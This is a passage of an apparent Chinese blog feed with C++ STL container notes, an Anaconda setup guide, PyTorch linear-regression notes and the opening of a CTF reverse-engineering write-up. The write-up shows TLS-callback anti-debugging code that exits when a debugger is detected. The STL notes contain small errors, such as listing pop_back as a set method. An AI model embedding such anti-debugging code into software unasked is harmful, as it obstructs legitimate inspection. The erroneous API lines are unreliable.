class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span> &#125;;<br><span class="hljs-function">list&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(n, n + <span class="hljs-number">5</span>)</span></span>; <span class="hljs-comment">// 将数组n的前5个元素作为集合a的初值</span><br></code></pre></td></tr></table></figure><ul><li>容器大小：<code>st.size();</code></li><li>容器最大容量：<code>st.max_size();</code></li><li>容器判空：<code>st.empty();</code></li><li>查找键 key 的元素个数：<code>st.count(key);</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; st;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)<br>&#123;<br>    st.<span class="hljs-built_in">insert</span>(i);<br>&#125;<br><br>cout &lt;&lt; st.<span class="hljs-built_in">size</span>() &lt;&lt; endl; <span class="hljs-comment">// 输出：6</span><br>cout &lt;&lt; st.<span class="hljs-built_in">max_size</span>() &lt;&lt; endl; <span class="hljs-comment">// 输出：214748364</span><br>cout &lt;&lt; st.<span class="hljs-built_in">count</span>(<span class="hljs-number">2</span>) &lt;&lt; endl; <span class="hljs-comment">// 输出：1</span><br><span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>())<br>    cout &lt;&lt; <span class="hljs-string">&quot;元素为空&quot;</span> &lt;&lt; endl; <span class="hljs-comment">// 未执行</span><br></code></pre></td></tr></table></figure><ul><li>在容器中插入元素：<code>st.insert(const T&amp; x);</code></li><li>任意位置插入一个元素：<code>st.insert(iterator it, const T&amp; x);</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; st;<br><br><span class="hljs-comment">// 在容器中插入元素</span><br>st.<span class="hljs-built_in">insert</span>(<span class="hljs-number">4</span>);<br><span class="hljs-comment">// 任意位置插入一个元素</span><br>set&lt;<span class="hljs-type">int</span>&gt;::iterator it = st.<span class="hljs-built_in">begin</span>();<br>st.<span class="hljs-built_in">insert</span>(it, <span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// 遍历显示</span><br><span class="hljs-keyword">for</span> (it = st.<span class="hljs-built_in">begin</span>(); it != st.<span class="hljs-built_in">end</span>(); it++)<br>    cout &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-comment">// 输出：2 4</span><br></code></pre></td></tr></table></figure><ul><li>删除容器中值为 elem 的元素：<code>st.pop_back(const T&amp; elem);</code></li><li>删除it迭代器所指的元素：<code>st.erase(iterator it);</code></li><li>删除区间 [first,last] 之间的所有元素：<code>st.erase(iterator first, iterator last);</code></li><li>清空所有元素：<code>st.clear();</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; st;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>    st.<span class="hljs-built_in">insert</span>(i);<br><br><span class="hljs-comment">// 删除容器中值为elem的元素</span><br>st.<span class="hljs-built_in">erase</span>(<span class="hljs-number">4</span>);<br><span class="hljs-comment">// 任意位置删除一个元素</span><br>set&lt;<span class="hljs-type">int</span>&gt;::iterator it = st.<span class="hljs-built_in">begin</span>();<br>st.<span class="hljs-built_in">erase</span>(it);<br><span class="hljs-comment">// 删除[first,last]之间的元素</span><br>st.<span class="hljs-built_in">erase</span>(st.<span class="hljs-built_in">begin</span>(), ++st.<span class="hljs-built_in">begin</span>());<br><br><span class="hljs-comment">// 遍历显示</span><br><span class="hljs-keyword">for</span> (it = st.<span class="hljs-built_in">begin</span>(); it != st.<span class="hljs-built_in">end</span>(); it++)<br>    cout &lt;&lt; *it &lt;&lt; <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-comment">// 输出：2 3 5 6 7</span><br>cout &lt;&lt; endl;<br><br><span class="hljs-comment">// 清空所有元素</span><br>st.<span class="hljs-built_in">clear</span>();<br><br><span class="hljs-comment">// 判断set是否为空</span><br><span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>())<br>    cout &lt;&lt; <span class="hljs-string">&quot;集合为空&quot;</span> &lt;&lt; endl; <span class="hljs-comment">// 输出：集合为空</span><br></code></pre></td></tr></table></figure><ul><li>查找键 key 是否存在,若存在，返回该键的元素的迭代器；若不存在，返回<code>set.end()： st.find(key);</code></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">set&lt;<span class="hljs-type">int</span>&gt; st;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    st.<span class="hljs-built_in">insert</span>(i);<br><br><span class="hljs-comment">// 通过find(key)查找键值</span><br>set&lt;<span class="hljs-type">int</span>&gt;::iterator it;<br>it = st.<span class="hljs-built_in">find</span>(<span class="hljs-number">2</span>);<br>cout &lt;&lt; *it &lt;&lt; endl; <span class="hljs-comment">// 输出：2</span><br></code></pre></td></tr></table></figure><h3 id="unordered-set"><a href="#unordered-set" class="headerlink" title="unordered_set"></a>unordered_set</h3><p>​<code>unordered_set</code>本质是使用<code>hash</code>散列的方式存储数据，是一种使<strong>用hash值作为key</strong>的容器，所以当有频繁的搜索、插入和移除拥有常数时间。<code>unordered_set</code>存储原理是声明一个有<code>n</code>个桶的数据结构，计算加入到<code>unordered_set</code>的新的值<code>hash</code>，然后计算<code>hash%n</code>后的值<code>x</code>，将新的值加入到桶<code>x</code>中。<strong>当桶x中已经有了元素，就直接链接在后边</strong>。当数据结构中的元素满足一定数量时需要扩充桶的数量，并重新构建桶结构。它具有以下特点：</p><p>　　1、<code>unordered_set</code>是一种容器，它以不特定的顺序存储<strong>唯一</strong>的元素，并允许根据元素的值快速检索单个元素。</p><p>　　2、在<code>unordered_set</code>中，元素的值同时是唯一标识它的键。键是不可变的，只可增删，不可修改。</p><p>　　3、在内部，<code>unordered_set</code>中的元素没有按照任何特定的顺序排序，而是根据它们的散列值组织成桶（一个线性链表代表一个桶），从而允许通过它们的值直接快速访问单个元素（平均时间复杂度为常数）。</p><p>　　4、<code>unordered_set</code>容器比<code>set</code>容器更快地通过它们的键访问单个元素，尽管它们在元素子集的范围迭代中通常效率较低。</p><p>　　5、容器中的迭代器<strong>只能是正向迭代器</strong>。</p><p><strong>初始化：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unordered_set&gt;</span></span><br><br>unordered_set&lt;<span class="hljs-type">char</span>&gt; example;<br>unordered_set&lt;string&gt; things &#123;<span class="hljs-number">16</span>&#125;; <span class="hljs-comment">// 16 buckets</span><br>unordered_set&lt;string&gt; words &#123;<span class="hljs-string">&quot;one&quot;</span>, <span class="hljs-string">&quot;two&quot;</span>, <span class="hljs-string">&quot;three&quot;</span>, <span class="hljs-string">&quot;four&quot;</span>&#125;;<span class="hljs-comment">// Initializer list</span><br>unordered_set&lt;string&gt; copy_wrds &#123;words&#125;; <span class="hljs-comment">// Copy constructor</span><br></code></pre></td></tr></table></figure><p><strong>操作：</strong></p><p>插入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Returns a pair - an iterator &amp; a bool value</span><br><span class="hljs-keyword">auto</span> pr = words.<span class="hljs-built_in">insert</span>(<span class="hljs-string">&quot;ninety&quot;</span>);<br><span class="hljs-comment">// 1st arg is a hint. Returns an iterator</span><br><span class="hljs-keyword">auto</span> iter = words.<span class="hljs-built_in">insert</span> (pr.first, <span class="hljs-string">&quot;nine&quot;</span>); <br></code></pre></td></tr></table></figure><p>查找，调用 unordered_set 的<code>find()</code>会返回一个迭代器。这个迭代器指向和参数哈希值匹配的元素，如果没有匹配的元素，会返回这个容器的结束迭代器<code>(set.end())</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <br>    std::unordered_set&lt;<span class="hljs-type">int</span>&gt; example = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br>    <span class="hljs-keyword">auto</span> search = example.<span class="hljs-built_in">find</span>(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (search != example.<span class="hljs-built_in">end</span>()) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; (*search) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Not found\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>删除，成员函数clear()可以删除它的全部元素。</p><p>成员函数erase()可以删除容器中和传入参数的哈希值相同的元素。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::pair&lt;string, string&gt; person &#123; <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;Smith&quot;</span>&#125;;<br><span class="hljs-keyword">auto</span> iter = names.<span class="hljs-built_in">find</span>(person);<br><span class="hljs-keyword">if</span>(iter != std::<span class="hljs-built_in">end</span>(names))<br>    names.<span class="hljs-built_in">erase</span>(iter);<br></code></pre></td></tr></table></figure><p>迭代</p><p>与正常容器迭代相同</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">unordered_set&lt;balloon,balloon_hash&gt;::iterator iter = balloons.<span class="hljs-built_in">begin</span>();<br><span class="hljs-keyword">while</span>(iter != balloons.<span class="hljs-built_in">end</span>())&#123;<br>    iter++;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>采用二进制存储状态</p><p>转小写数字字符方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> n = s.<span class="hljs-built_in">size</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n; i++)<br>&#123;<br>    s[i] += (s[i]&gt;=<span class="hljs-number">65</span>&amp;&amp;s[i]&lt;=<span class="hljs-number">90</span>)?<span class="hljs-number">32</span>:<span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>c++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Anaconda安装与使用</title>
    <link href="/2024/01/26/Anaconda%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/01/26/Anaconda%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>老是忘，浅浅记录一下</p><span id="more"></span><h3 id="Anaconda安装配置"><a href="#Anaconda安装配置" class="headerlink" title="Anaconda安装配置"></a>Anaconda安装配置</h3><p>下载链接：</p><p><a href="https://www.anaconda.com/download/">官网</a></p><p>双击anaconda.exe直接运行安装包，一直Next到下图位置：</p><p>第一个选项是添加环境变量，默认是没有勾选的，请务必勾选上，如果这里不勾选，后续安装完成后要自行添加环境变量</p><p><img src="/2024/01/26/Anaconda%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/Snipaste_2024-05-21_13-56-15.png"></p><p>1.修改为清华源<br>直接打开cmd输入以下命令<br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud//pytorch/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud//pytorch/</a><br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</a><br>conda config –set show_channel_urls yes<br>2.移除清华源<br>输入：conda config –remove channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</a><br>这个命令是为了移除之前conda config –show channels显示的清华源。</p><h3 id="Anaconda使用"><a href="#Anaconda使用" class="headerlink" title="Anaconda使用"></a>Anaconda使用</h3><p>主要用的两个为Anaconda Prompt 和Anaconda Navigator</p><p><code>conda info</code>查看当前环境的信息</p><p><code>conda</code>配置新环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> CONDA_FORCE_32BIT=1 <span class="hljs-comment"># 切换到32位</span><br><span class="hljs-built_in">set</span> CONDA_FORCE_32BIT=0 <span class="hljs-comment"># 切换到64位</span><br>conda create -n pytorch python=3.10<br>conda <span class="hljs-built_in">env</span> list<br>conda activate pytorch<br>conda install matplotlib<br></code></pre></td></tr></table></figure><p><code>conda create -n xxx python=2.7</code>创建一个python2.7 名为xxx的虚拟环境，如要创建32位的python环境，先设置为32位在创建环境，这样创建好的环境即为32位的Python环境，先切换到创建好的环境中，然后输入python 检查下是否为32位的python2.7版本</p><p>在<code>pycharm</code>中使用<code>conda</code>环境：</p><p>在创建新的项目时，选择先前配置的解释器，然后选择自己已经配置好的<code>conda</code>环境即可。</p><p><img src="/2024/01/26/Anaconda%E5%91%BD%E4%BB%A4%E5%B0%8F%E8%AE%B0/Snipaste_2024-01-26_14-06-38.png"></p><h3 id="解决Powershell中无法切换环境问题"><a href="#解决Powershell中无法切换环境问题" class="headerlink" title="解决Powershell中无法切换环境问题"></a>解决Powershell中无法切换环境问题</h3><p>在terminal中输入然后重新打开</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">conda init powershell<br></code></pre></td></tr></table></figure><h3 id="解决conda新环境pip出现SSLError"><a href="#解决conda新环境pip出现SSLError" class="headerlink" title="解决conda新环境pip出现SSLError"></a>解决conda新环境pip出现SSLError</h3><p>大概率是因为开了全局代理，证书不安全导致，关闭系统代理即可</p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Anaconda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习笔记1</title>
    <link href="/2024/01/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/2024/01/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<p>得跟上时代潮流了🐸</p><span id="more"></span><h1 id="机器学习笔记1"><a href="#机器学习笔记1" class="headerlink" title="机器学习笔记1"></a>机器学习笔记1</h1><p><a href="https://easyai.tech/">一个很好的AI基础自学网站</a></p><h3 id="监督学习-无监督学习"><a href="#监督学习-无监督学习" class="headerlink" title="监督学习&amp;无监督学习"></a>监督学习&amp;无监督学习</h3><h4 id="监督学习"><a href="#监督学习" class="headerlink" title="监督学习"></a>监督学习</h4><p><strong>监督学习需要有明确的目标，明确想要什么结果。</strong></p><p>监督并不是指人站在机器旁边看机器是否在做正确的事情，而是指以下过程：</p><ol><li>选择适合目标任务的数学模型</li><li>首先<strong>给出一些已知的“问题和答案”（训练集）</strong>给机器学习</li><li>机器总结出自己的“方法论”</li><li>人类向机器提出“新问题”（测试集）让他回答</li></ol><p>对于连续和离散两种数据，分别对于回归和分类的方法</p><h4 id="无监督学习"><a href="#无监督学习" class="headerlink" title="无监督学习"></a>无监督学习</h4><p><strong>无监督学习是机器学习训练的一种形式。它本质上是一种统计工具，可以在未标记的数据中找到潜在结构的训练方法。</strong></p><p>它主要有3个特点：</p><ol><li>无监督学习没有明确的目的</li><li>无监督学习不需要标记数据</li><li>无监督学习无法量化结果</li></ol><p>聚类：简单来说就是一种自动分类方法。在监督学习中，您确切地知道每个类别是什么，但聚类则不然。你不知道聚类后的几个类别分别代表什么意思。</p><p>降维：维度看起来很像压缩。这是为了在尽可能保留相关结构的同时降低数据的复杂性。</p><h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><h3 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h3><p><strong>梯度下降法就是一种通过求目标函数的导数来寻找目标函数最小化的方法。</strong></p><p><strong>梯度下降目的是找到目标函数最小化时的取值所对应的自变量的值，目的是为了找自变量X。</strong></p><h4 id="批量梯度下降"><a href="#批量梯度下降" class="headerlink" title="批量梯度下降"></a>批量梯度下降</h4><p>也可以说是线性回归的梯度下降，学到的第一个机器学习模型啦</p><p>对于线性回归的代价函数：其实就是求误差的平方和<br>$$<br>J(w,b)&#x3D;J((w_0,b_0);(w_1,b_1);…(w_m,b_m);)&#x3D;\frac{1}{2m}\sum_{i&#x3D;1}^{m}(f(x_i)-y_i)^2<br>$$</p><p>$$<br>f(x)&#x3D;wx+b<br>$$</p><p>梯度下降的更新过程：<br>$$<br>w_i :&#x3D;w_i-\alpha\frac{\partial}{\partial w_i}J(w,b)<br>$$</p><p>$$<br>b_i :&#x3D;b_i-\alpha\frac{\partial}{\partial b_i}J(w,b)<br>$$</p><p>其中，<code>:=</code>是赋值的意思，<code>\alpha</code>是学习率，又可以理解为每次下降的步长。这里需要注意的是，对于<code>w,b</code>是同时更新的，不能用这次新计算出的<code>w</code>去计算新的<code>b</code>。</p><p>不难发现，批量梯度下降每次都要使用所有的数据，可以保证每次都朝着正确的方向进行，但是计算量很大。</p><p><code>torch.nn.MSELoss()</code>是<code>PyTorch</code>中的一个损失函数类，用于计算均方误差（Mean Squared Error，MSE）。<code>MSE</code>是回归任务中常用的损失函数之一，用于衡量模型的预测值与真实值之间的差异。</p><p><code>MSE</code>的计算公式为:<br>$$<br>MSE &#x3D; \frac{1}{n}*\sum(Y_{pred}-Y)^2<br>$$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 批量梯度下降</span><br><span class="hljs-comment"># 定义训练数据</span><br>X = torch.tensor([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>, <span class="hljs-number">24</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>, <span class="hljs-number">55</span>], dtype=torch.float32)<br>Y = torch.tensor([<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">23</span>, <span class="hljs-number">32</span>, <span class="hljs-number">40</span>, <span class="hljs-number">51</span>, <span class="hljs-number">71</span>], dtype=torch.float32)<br><span class="hljs-built_in">print</span>(X)<br><br><span class="hljs-comment"># 初始化模型参数</span><br>w = torch.tensor(<span class="hljs-number">0.0</span>, requires_grad=<span class="hljs-literal">True</span>)<br>b = torch.tensor(<span class="hljs-number">0.0</span>, requires_grad=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 定义代价函数</span><br>cost_func = torch.nn.MSELoss()<br><br><span class="hljs-comment"># 定义优化器和超参数</span><br>optimizer = torch.optim.SGD([w, b], lr=<span class="hljs-number">0.01</span>)<br>epochs = <span class="hljs-number">100</span><br><br><span class="hljs-comment"># 批量梯度下降</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(epochs):<br>    <span class="hljs-comment"># 前向传播：使用当前的参数值对训练数据进行前向传播，</span><br>    <span class="hljs-comment"># 计算模型的预测值。对于线性回归问题，预测值可以表示为线性方程的结果，</span><br>    <span class="hljs-comment"># 即Y_pre = w * X + b</span><br>    Y_pre = w * X + b<br>    cost = cost_func(Y_pre, Y)<br><br>    cost.backward()<span class="hljs-comment"># 对应求偏导的过程</span><br>    optimizer.step()<span class="hljs-comment"># 对应更新参数的过程</span><br>    optimizer.zero_grad()<span class="hljs-comment"># 清空本次梯度</span><br>    <span class="hljs-comment"># 输出结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;w = <span class="hljs-subst">&#123;w.item()&#125;</span>, b = <span class="hljs-subst">&#123;b.item()&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 绘制拟合直线</span><br>plt.scatter(X.numpy(), Y.numpy())<br>plt.plot(X.numpy(), (w * X + b).detach().numpy(), <span class="hljs-string">&#x27;r&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023强网杯babyre</title>
    <link href="/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/"/>
    <url>/2023/12/20/2023%E5%BC%BA%E7%BD%91%E6%9D%AFbabyre/</url>
    
    <content type="html"><![CDATA[<p>这道题比赛的时候做了半天也没有做出了，加密部分倒是搞懂了，就是得不到正确的flag，后来看来题解才知道自己的路还有很长</p><span id="more"></span><h3 id="做题前置知识"><a href="#做题前置知识" class="headerlink" title="做题前置知识"></a>做题前置知识</h3><h4 id="TLS反调试机制"><a href="#TLS反调试机制" class="headerlink" title="TLS反调试机制"></a>TLS反调试机制</h4><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">参考文章1</a></p><p><a href="https://www.cnblogs.com/helloylh/p/17209669.html">参考文章2</a></p><p><code>TLS</code>是<code>Thread Local Storage</code>的缩写，即线程局部存储。<strong>主要是为了解决多线程中变量同步的问题</strong>。</p><p>根据我们所学习的<code>OS</code>的知识，进程中的全局变量和函数内的静态变量，是各个线程都可以访问的共享变量，即<code>线程a</code>修改后，<code>线程b</code>访问时就不是原来的了，当然<code>OS</code>利用信号量解决这种同步问题。</p><p>这造成昂贵的同步开销，所以我们选择一种方式使得每个线程可以保有自己的内部变量，被称为<code>static memory local to a thread</code>线程局部静态变量。这一种新的实现机制就是<code>TLS</code></p><p>强网杯这道题具体用的应该是静态绑定</p><p>那么关于TLS在C++中的具体实现应该如下：</p><ol><li><p>编译器声明使用TLS回调</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64       <span class="hljs-comment">//64位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:tls_callback_func&quot;</span>) </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span>               <span class="hljs-comment">//32位</span></span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:__tls_used&quot;</span>) </span><br>     <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (linker, <span class="hljs-string">&quot;/INCLUDE:_tls_callback_func&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li><p>编写TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> NTAPI <span class="hljs-title">tls_callback</span><span class="hljs-params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;<br>    BOOL ret;<br>    <span class="hljs-built_in">CheckRemoteDebuggerPresent</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;ret);<span class="hljs-comment">//检测是否被调试</span><br>    <span class="hljs-keyword">if</span> (ret) &#123;<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//退出程序</span><br>    &#125;   <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>注册TLS回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64                           <span class="hljs-comment">//64位</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> const_seg(<span class="hljs-string">&quot;.CRT$XLF&quot;</span>)</span><br>    EXTERN_C <span class="hljs-type">const</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;.CRT$XLF&quot;</span>)        <span class="hljs-comment">//32位</span></span><br>    EXTERN_C<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>PIMAGE_TLS_CALLBACK tls_callback_func[] = &#123; 